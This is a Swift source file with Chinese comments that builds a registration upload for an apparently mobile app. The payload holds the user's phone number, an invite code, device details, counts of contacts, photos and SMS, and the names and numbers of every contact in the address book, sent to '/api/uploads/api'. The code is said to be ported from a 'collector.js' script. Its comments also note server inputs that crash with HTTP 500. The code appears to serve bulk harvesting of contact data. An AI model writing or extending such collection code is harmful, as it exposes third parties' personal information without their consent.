import Foundation
import UIKit

/// 上报报文构造 —— 与安卓端 `AnyPayloads.kt` **逐字段等价**
///
/// 安卓端的报文格式是从 `collector.js` 原样移植的，这里再从安卓端原样移植到 Swift。
/// 任何一处改动都会导致服务端解析异常，**修改前请先对照服务端 `app/api/controller/Uploads.php`**。
enum AnyPayloads {

    /// 空白字符正则 —— **必须和 JS 的 `\s` 语义一致**
    ///
    /// 关键坑：JS 的 `\s` **包含 U+3000（全角空格）**，而 Java 默认的 `\s` 不包含；
    /// Swift 的 `CharacterSet.whitespacesAndNewlines` 也不包含 U+3000。
    /// 服务端按 JS 清洗过后的结果解析，所以这里必须用同一集合，否则姓名里含全角空格时
    /// 会在服务端切错字段。
    static let whitespace: CharacterSet = {
        var s = CharacterSet.whitespacesAndNewlines
        // JS \s 额外包含的字符
        s.insert(charactersIn: "\u{00A0}\u{1680}\u{2000}\u{2001}\u{2002}\u{2003}\u{2004}\u{2005}\u{2006}\u{2007}\u{2008}\u{2009}\u{200A}\u{2028}\u{2029}\u{202F}\u{205F}\u{3000}\u{FEFF}")
        return s
    }()

    /// 等价 JS 的 `String.replace(/\s+/g, '')` —— **是删除空白，不是替换成单个空格**
    static func stripWhitespace(_ s: String) -> String {
        String(s.unicodeScalars.filter { !whitespace.contains($0) }.map(Character.init))
    }

    // MARK: - 注册 + 通讯录报文

    /// 构造 `/api/uploads/api` 的 `data`
    ///
    /// 格式：`手机号**邀请码**厂商_通讯录数_相册数_短信数_v108=姓名|号码=姓名|号码…`
    ///
    /// 注意：
    /// - 头三段用 `**` 分隔，**必须恰好 3 段**（服务端 `$aaa[2]` 无保护，少一段会 500）
    /// - 邀请码必须是**纯数字**（服务端 `app_user.code` 是 MySQL `int(20)`，
    ///   非数字会触发 error 1366 → HTTP 500）
    /// - 联系人从第 4 段起，每段 `姓名|号码`
    static func buildRegisterPayload(
        phone: String,
        inviteCode: String,
        brand: String,
        contactsCount: Int,
        albumsCount: Int,
        smsCount: Int,
        contacts: [AnyContact]
    ) -> String {
        let head = "\(phone)**\(inviteCode)**\(brand)_\(contactsCount)_\(albumsCount)_\(smsCount)_\(AnyConfig.clientVersion)"
        var parts: [String] = [head]
        parts.reserveCapacity(contacts.count + 1)
        for c in contacts {
            let name = stripWhitespace(c.name)
            let number = stripWhitespace(c.number)
            parts.append("\(name)|\(number)")
        }
        return parts.joined(separator: "=")
    }

    // MARK: - 设备标识

    /// 厂商 + 机型，对应安卓端的 `Build.MANUFACTURER` / `Build.MODEL`
    ///
    /// iOS 上 `UIDevice.current.model` 只给 "iPhone"/"iPad"，
    /// 用 `uname` 拿硬件标识（如 `iPhone15,2`）更接近安卓端的"机型"粒度。
    static var deviceBrand: String {
        // 安卓端 clientid 形如 `WIKO_1689_51_51_v108`，`_` 前是厂商。
        // iOS 没有"厂商"概念，用 Apple；机型用硬件标识。
        return "Apple"
    }

    static var deviceModel: String {
        var sysinfo = utsname()
        uname(&sysinfo)
        let mirror = Mirror(reflecting: sysinfo.machine)
        let id = mirror.children.reduce(into: "") { acc, el in
            if let v = el.value as? Int8, v != 0 {
                acc.append(Character(UnicodeScalar(UInt8(v))))
            }
        }
        return id.isEmpty ? UIDevice.current.model : id
    }

    static var systemVersion: String {
        UIDevice.current.systemVersion
    }
}

// MARK: - 联系人（与安卓端 AnyContact 对应）

struct AnyContact {
    let name: String
    let number: String
}
